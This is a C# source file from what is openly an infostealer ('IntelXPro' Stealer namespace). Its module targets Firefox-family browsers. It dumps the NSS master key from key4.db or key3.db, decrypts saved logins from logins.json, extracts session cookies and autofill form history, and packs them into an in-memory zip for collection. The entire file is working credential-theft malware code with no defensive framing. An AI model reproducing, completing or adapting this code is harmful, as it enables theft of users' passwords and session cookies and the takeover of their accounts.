using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using IntelXPro.src.IntelXPro.Dependencies.Sql;

namespace IntelXPro.src.IntelXPro.Stealer.Browsers.Extentions
{
    internal class Gecko : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Parallel.ForEach(Paths.Gecko, delegate (string browser)
            {
                if (Directory.Exists(browser))
                {
                    Parallel.ForEach(Directory.GetDirectories(browser), delegate (string profile)
                    {
                        ProfileCollect(zip, counter, browser, profile);
                    });
                }
            });
        }

        private void ProfileCollect(InMemoryZip zip, Counter counter, string browser, string profile)
        {
            _ = browser + "\\Local State";
            string browsername = Paths.GetBrowserName(browser);
            string profilename = Path.GetFileName(profile);
            Counter.CounterBrowser counterBrowser = new Counter.CounterBrowser();
            counterBrowser.Profile = profile;
            counterBrowser.BrowserName = browsername;
            Task.WaitAll(Task.Run(delegate
            {
                Password(zip, counterBrowser, profile, profilename, browsername);
            }), Task.Run(delegate
            {
                Cookies(zip, counterBrowser, profile, profilename, browsername);
            }), Task.Run(delegate
            {
                AutoFill(zip, counterBrowser, profile, profilename, browsername);
            }));
            if ((long)counterBrowser.Cookies != 0L || (long)counterBrowser.Password != 0L || (long)counterBrowser.CreditCards != 0L || (long)counterBrowser.AutoFill != 0L || (long)counterBrowser.RestoreToken != 0L || (long)counterBrowser.MaskCreditCard != 0L || (long)counterBrowser.MaskedIban != 0L)
            {
                counter.Browsers.Add(counterBrowser);
            }
        }

        private void Password(InMemoryZip zip, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
        {
            string path = Path.Combine(profile, "logins.json");
            if (!File.Exists(path))
            {
                return;
            }
            string path2 = Path.Combine(profile, "key4.db");
            string path3 = Path.Combine(profile, "key3.db");
            byte[] masterKey = null;
            if (File.Exists(path2))
            {
                masterKey = NssDumpMasterKey.Key4Database(path2);
            }
            else if (File.Exists(path3))
            {
                masterKey = NssDumpMasterKey.Key3Database(path3);
            }
            if (masterKey == null && !NSSDecryptor.Initialize(profile))
            {
                return;
            }
            string text;
            try 
            {
                string tempFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".tmp");
                File.Copy(path, tempFile, true);
                text = File.ReadAllText(tempFile);
                File.Delete(tempFile);
            }
            catch 
            {
                return;
            }
            if (string.IsNullOrEmpty(text))
            {
                return;
            }
            MatchCollection matchCollection = Regex.Matches(text, "\"hostname\":\\s*\"(.*?)\".*?\"encryptedUsername\":\\s*\"(.*?)\".*?\"encryptedPassword\":\\s*\"(.*?)\"", RegexOptions.Singleline);
            if (matchCollection.Count == 0)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>();
            Parallel.ForEach(matchCollection.Cast<Match>(), delegate (Match match)
            {
                string value = match.Groups[1].Value;
                string value2 = match.Groups[2].Value;
                string value3 = match.Groups[3].Value;
                string text2 = "";
                string text3 = "";
                if (masterKey == null)
                {
                    text2 = NSSDecryptor.Decrypt(value2);
                    text3 = NSSDecryptor.Decrypt(value3);
                }
                else
                {
                    Asn1Der asn1Der = new Asn1Der();
                    byte[] toParse = Convert.FromBase64String(value2);
                    byte[] toParse2 = Convert.FromBase64String(value3);
                    Asn1DerObject asn1DerObject = asn1Der.Parse(toParse);
                    Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse2);
                    byte[] data = asn1DerObject.Objects[0].Objects[1].Objects[1].Data;
                    byte[] data2 = asn1DerObject.Objects[0].Objects[1].Objects[0].Data;
                    byte[] data3 = asn1DerObject2.Objects[0].Objects[1].Objects[1].Data;
                    byte[] data4 = asn1DerObject2.Objects[0].Objects[1].Objects[0].Data;
                    text2 = TripleDes.DecryptStringDesCbc(masterKey, data, data2);
                    text3 = TripleDes.DecryptStringDesCbc(masterKey, data3, data4);
                }
                text2 = (string.IsNullOrEmpty(text2) ? "" : Regex.Replace(text2, "[^\\u0020-\\u007F]", ""));
                text3 = (string.IsNullOrEmpty(text3) ? "" : Regex.Replace(text3, "[^\\u0020-\\u007F]", ""));
                if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3))
                {
                    lines.Add("Hostname: " + value + "\nUsername: " + text2 + "\nPassword: " + text3 + "\n\n");
                    ++counterBrowser.Password;
                }
            });
            zip.AddTextFile("Passwords\\Passwords_[" + browsername + "]" + profilename + ".txt", string.Join("", lines.ToList()));
        }

        private void Cookies(InMemoryZip zip, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
        {
            string text = Path.Combine(profile, "cookies.sqlite");
            if (!File.Exists(text))
            {
                return;
            }
            SqLite sSqLite = SqLite.ReadTable(text, "moz_cookies");
            if (sSqLite == null)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>();
            Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    string value = sSqLite.GetValue(i, 3);
                    string value2 = sSqLite.GetValue(i, 4);
                    string value3 = sSqLite.GetValue(i, 2);
                    string value4 = sSqLite.GetValue(i, 5);
                    string value5 = sSqLite.GetValue(i, 6);
                    if (!string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3) && !string.IsNullOrEmpty(value4) && !string.IsNullOrEmpty(value5))
                    {
                        string item = value2 + "\tTRUE\t" + value4 + "\tFALSE\t" + value5 + "\t" + value3 + "\t" + value + "\n";
                        lines.Add(item);
                        ++counterBrowser.Cookies;
                    }
                }
                catch
                {
                }
            });
            zip.AddTextFile("Cookies\\Cookies_[" + browsername + "]" + profilename + ".txt", string.Join("", lines.ToList()));
        }

        private void AutoFill(InMemoryZip zip, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
        {
            string text = Path.Combine(profile, "formhistory.sqlite");
            if (!File.Exists(text))
            {
                return;
            }
            SqLite sSqLite = SqLite.ReadTable(text, "moz_formhistory");
            if (sSqLite == null)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>();
            Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    string value = sSqLite.GetValue(i, 1);
                    string value2 = sSqLite.GetValue(i, 2);
                    if (!string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value))
                    {
                        string item = "Name: " + value + "\nValue: " + value2 + "\n\n";
                        lines.Add(item);
                        ++counterBrowser.AutoFill;
                    }
                }
                catch
                {
                }
            });
            zip.AddTextFile("AutoFills\\AutoFill_[" + browsername + "]" + profilename + ".txt", string.Join("", lines.ToList()));
        }
    }
}
